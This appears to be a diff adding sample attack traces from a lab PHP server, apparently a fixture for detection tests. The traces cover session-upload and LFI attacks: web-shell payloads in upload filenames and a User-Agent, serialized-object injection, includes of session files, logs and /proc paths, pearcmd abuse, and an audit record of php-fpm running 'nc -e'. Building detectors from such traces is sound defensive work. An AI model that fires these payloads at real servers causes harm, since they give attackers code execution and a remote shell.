@@ -21,11 +21,15 @@ Oct 27 04:12:10 web01 audit: type=EXECVE msg=audit(1:101): argc=4 a0="curl" a1="
 Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
 Content-Disposition: form-data; name="PHPSESSID"
 Content-Disposition: form-data; name="PHPSESSID_EXTRA"
+Content-Disposition:name=PHPSESSID
 Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS
 Content-Type: multipart/form-data; boundary=CCCCCCCCCC
+Content-Type: multipart/form-data; boundary="SSSSSSSSSSSSSSSSS"
+Content-Type: multipart/form-data; boundary=----php2shellscanner1a2b3c4d
 Content-Disposition: form-data; name="f"; filename="<?php echo 'marker'; ?>"
 Content-Disposition: form-data; name="f"; filename="x|O:8:\"stdClass\":0:{}"
 Content-Disposition: form-data; name="f"; filename="%3C%3Fphp system($_GET[1]); ?>"
+Content-Disposition: form-data; name="f"; filename="%3C?php system($_GET[1]); ?>"
 auto_prepend_file=/tmp/sess_abc123def456
 HTTP/1.1 200 OK response body marker <<<P2S>>>uid=33(www-data)
 Content-Disposition:name=a[a][a][a][a][a][a][a][a][a][a][a];filename=
@@ -36,3 +40,22 @@ Set-Cookie: PHPSESSID="; path=/
 10.0.0.5 - - [27/Oct/2026:04:16:01 +0700] "GET /vuln.php?page=/var/tmp/php_sessions/sess_abc123def456ghi789 HTTP/1.1" 200 512 "-" "-"
 10.0.0.5 - - [27/Oct/2026:04:16:02 +0700] "GET /vuln.php?file=/var/log/nginx/access.log HTTP/1.1" 200 512 "-" "-"
 10.0.0.5 - - [27/Oct/2026:04:16:03 +0700] "GET /index.php HTTP/1.1" 200 512 "-" "<?php system($_GET[c]); ?>"
+2026/10/27 04:12:07 [error] 1234#1234: *12 client intended to send too large body: 134217728 bytes, client: 10.0.0.5, server: lab, request: "POST /index.php HTTP/1.1"
+10.0.0.5 - - [27/Oct/2026:04:14:00 +0700] "GET /index.php HTTP/1.1" 200 512 "-" "php2shell-scanner/1.0"
+10.0.0.5 - - [27/Oct/2026:04:14:01 +0700] "GET /sess_abc123def456ghi789abc HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+Content-Type: multipart/form-data; boundary=BBBBBBBBBB
+Content-Type: multipart/form-data; boundary=BNDRY12345
+Content-Type: multipart/form-data; boundary=
+Content-Disposition: form-data; name="PHPSESSID"; value="attacksessionid0001"
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"; value='|O:9:"LabGadget":2:{}'
+Content-Disposition: form-data; name="s000"; value="SPRAY000..................................................."
+auth_pass=ZeroHackPersist2026&cmd=id
+Content-Disposition: form-data; name="session.serialize_handler"
+10.0.0.5 - - [27/Oct/2026:04:17:01 +0700] "GET /pearcmd.php?+config-create+/tmp/x HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:17:02 +0700] "GET /shell.phtml HTTP/1.1" 200 512 "-" "-"
+Oct 27 04:17:03 web01 audit: type=SYSCALL msg=audit(1:102): exe="/usr/sbin/php-fpm8.2" ppid=991 path="/proc/self/mem"
+10.0.0.5 - - [27/Oct/2026:04:17:04 +0700] "GET /vuln.php?file=/proc/self/fd/3 HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:17:05 +0700] "GET /vuln.php?page=C:\Windows\Temp\sess_abc123def456 HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:17:06 +0700] "GET /vuln.php?page=..%2f..%2fvar/lib/php/sessions/sess_abc123def456 HTTP/1.1" 200 512 "-" "-"
+10.0.0.5 - - [27/Oct/2026:04:17:07 +0700] "GET /var/log/httpd/access_log HTTP/1.1" 200 512 "-" "-"
+Oct 27 04:17:08 web01 audit: type=EXECVE msg=audit(1:103): argc=2 a0="nc" a1="-e" exe="/usr/sbin/php-fpm8.2"
